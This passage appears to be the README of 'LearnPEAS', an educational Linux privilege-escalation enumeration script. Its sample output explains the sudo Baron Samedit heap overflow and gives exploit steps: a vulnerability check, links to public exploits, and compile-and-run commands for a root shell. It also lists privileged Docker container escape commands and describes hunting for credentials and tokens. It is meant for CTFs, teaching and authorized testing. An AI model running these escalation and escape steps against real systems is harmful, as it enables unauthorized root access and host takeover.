## Educational Framework

Unlike other enumeration tools, LearnPEAS doesn't just list vulnerabilities‚Äîit teaches you about them:

### Example: Sudo Version Vulnerability (Baron Samedit)

```
[!!! CRITICAL !!!] Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow
[VULNERABLE] sudo < 1.9.5p2 vulnerable

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë  CVE-2021-3156 - Baron Samedit (Heap Buffer Overflow)
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

WHAT IT IS:
  A heap-based buffer overflow in sudo that allows any local
  user to gain root WITHOUT needing a password or sudo access.
  One of the most critical sudo vulnerabilities ever found.

WHY IT EXISTS:
  When sudo processes command-line arguments, it needs to handle
  backslashes (\) specially. There's a bug in how it counts
  backslashes when a command runs in 'shell mode' (with -s or -i).

THE TECHNICAL FLAW:
  1. Sudo allocates a buffer (memory) to store the command
  2. When processing backslashes, it miscounts the length needed
  3. This causes sudo to write PAST the end of the buffer (overflow)
  4. By carefully crafting the overflow, attacker controls memory
  5. Attacker overwrites function pointers to execute their code
  6. Since sudo runs as root, the attacker's code runs as root

WHY IT'S CALLED BARON SAMEDIT:
  Play on words: 'Sudo edit' ‚Üí 'Baron Samedit'
  The vulnerability is in sudoedit, a symlink to sudo

HOW TO EXPLOIT:
  1. Check if vulnerable:
     sudoedit -s / (if you get usage error = vulnerable)
  2. Download exploit:
     https://github.com/blasty/CVE-2021-3156
     https://github.com/worawit/CVE-2021-3156
  3. Compile the exploit (usually a C program):
     gcc exploit.c -o exploit
  4. Run it:
     ./exploit
  5. Get root shell

WHY IT WORKS:
  ‚Ä¢ No sudo privileges needed (any user can exploit)
  ‚Ä¢ No password required
  ‚Ä¢ Works on most Linux distributions
  ‚Ä¢ Vulnerability existed for 10+ years (since 2011)

IMPACT: Any user ‚Üí Root, no credentials needed
```

### Example: Container Escape Detection

```
[WARNING] Running inside a DOCKER container

[INFO] Checking if container is privileged...
[!!! CRITICAL !!!] PRIVILEGED CONTAINER - Full host access possible
[VULNERABLE] Container is PRIVILEGED!

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë  Privileged Container Escape
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

WHAT: Privileged containers have almost all capabilities and can 
      access host devices.

WHY IT MATTERS: The --privileged flag disables most security features.
                It's used for nested Docker, device access, etc. But it 
                allows mounting host filesystem and accessing host resources.

HOW TO EXPLOIT:
  1. List host disks: fdisk -l
  2. Mount host root: mkdir /mnt/host && mount /dev/sda1 /mnt/host
  3. Chroot to host: chroot /mnt/host /bin/bash
  4. Alternative: Access /dev/mem or /dev/kmem for direct memory access

[LEARN] Privileged escape steps:
[LEARN]   fdisk -l  # Find host disk (usually /dev/sda1 or /dev/vda1)
[LEARN]   mkdir /mnt/host
[LEARN]   mount /dev/sda1 /mnt/host
[LEARN]   chroot /mnt/host /bin/bash
[LEARN]   # You're now on the host as root
```

```bash
./learnpeas.sh --flags
```

**Note:** Flag hunting is opt-in. Without `--flags`, the script will not search for or reveal CTF flags.

### Quick Scan
```bash
./learnpeas.sh --quick
```

### Options

```
Usage: ./learnpeas.sh [OPTIONS]

Options:
  -q, --quick      Quick scan (skip some slow checks)
  -f, --flags      Enable CTF flag hunting (searches for and reveals flags)
  -v, --verbose    Verbose output
  --no-explain     Skip educational explanations
  -h, --help       Show help message

Note: Extended mode is ALWAYS enabled by default (cloud metadata, databases,
      web apps, CI/CD, application services, etc.)
```

## Interactive Features

### Skippable Long-Running Checks
LearnPEAS allows you to skip time-consuming checks by pressing **ENTER**:
- API key and token discovery (searches through /home, /var/www, /opt, /etc, /tmp)
- Process monitoring for hidden cron jobs (60-second watch)
- Password and credential hunting (extensive file searches)

Simply press ENTER during these checks to continue to the next enumeration section.

## Educational Philosophy

LearnPEAS teaches you to think like a privilege escalation expert:

- **Understand the "Why"**: Don't just memorize commands - understand why vulnerabilities exist
- **Pattern Recognition**: Learn to recognize similar issues across different systems
- **Mental Models**: Build frameworks for approaching privilege escalation systematically
- **Manual Verification**: Always test findings manually, don't just trust automated tools

```bash
# Initial foothold - understand what you have
./learnpeas.sh

# Enable flag hunting to find objectives
./learnpeas.sh --flags

# Review the log file to understand each finding
cat /tmp/learnpeas_*.log

# Targeted enumeration (quieter, less noisy)
./learnpeas.sh --quick --no-explain
```

## Output Priority

The script produces findings in priority order:
- **[!!! CRITICAL !!!]** - Instant root or near-instant privilege escalation
- **[üö© CTF FLAG üö©]** - CTF flag locations (only with --flags)
- **[VULNERABLE]** - Exploitable findings requiring some work
- **[WARNING]** - Potential issues worth investigating
- **[INFO]** - General information about the system
- **[LEARN]** - Educational explanations (can be disabled with `--no-explain`)
- **[OK]** - Confirmations that security controls are working

## Legal Disclaimer

This tool is designed for:
- Authorized penetration testing
- CTF competitions
- Educational environments
- Personal lab systems

**Never run on systems you don't own or have explicit permission to test.**

## Performance Notes

- Some checks can be slow on large filesystems (multiple `find /` commands)
- Extended mode adds significant runtime but provides comprehensive coverage
- Use `--quick` mode if time is critical
- Long-running checks (API keys, process monitoring) can be skipped by pressing ENTER

## Operational Security

This script is **not stealthy**. On monitored systems:
- Multiple find commands will be logged
- Process enumeration is visible
- File access attempts are auditable

For real red team engagements, use targeted manual checks instead.
